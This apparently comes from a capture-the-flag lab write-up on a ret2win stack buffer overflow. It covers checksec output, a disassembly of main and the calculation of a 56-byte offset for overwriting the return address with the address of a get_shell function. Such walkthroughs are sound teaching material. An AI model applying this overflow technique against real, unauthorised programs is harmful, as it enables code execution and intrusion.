**Read source code**
- As we can see there is `get_shell()` func so we use buffer overflow to overwrite the return address to the address of `get_shell`
- `Checksec` in gdb
```
Arch:     amd64
RELRO:      Partial RELRO
Stack:      No canary found
NX:         NX enabled
PIE:        No PIE (0x400000)
Stripped:   No
```
- `disass main`
```
   0x00000000004006e8 <+0>:     push   rbp
   0x00000000004006e9 <+1>:     mov    rbp,rsp
   0x00000000004006ec <+4>:     sub    rsp,0x30
   0x00000000004006f0 <+8>:     mov    eax,0x0
   0x00000000004006f5 <+13>:    call   0x400667 <init>
   0x00000000004006fa <+18>:    lea    rdi,[rip+0xbb]        # 0x4007bc
   0x0000000000400701 <+25>:    mov    eax,0x0
   0x0000000000400706 <+30>:    call   0x400540 <printf@plt>
   0x000000000040070b <+35>:    lea    rax,[rbp-0x30]
   0x000000000040070f <+39>:    mov    rsi,rax
   0x0000000000400712 <+42>:    lea    rdi,[rip+0xab]        # 0x4007c4
   0x0000000000400719 <+49>:    mov    eax,0x0
   0x000000000040071e <+54>:    call   0x400570 <__isoc99_scanf@plt>
   0x0000000000400723 <+59>:    mov    eax,0x0
   0x0000000000400728 <+64>:    leave
   0x0000000000400729 <+65>:    ret
```
- `buf`: rbp - 0x30
- `ret`: rbp + 0x8
- From rbp - 0x30 to rbp + 0x8 is 56 bytes
- Or we can find this adddress by subtract ret_addr and buf_addr (0x7fffffffde88-0x7fffffffde50 = 56)
=> Send 56 bytes + `get_shell` address (disass get_shell)
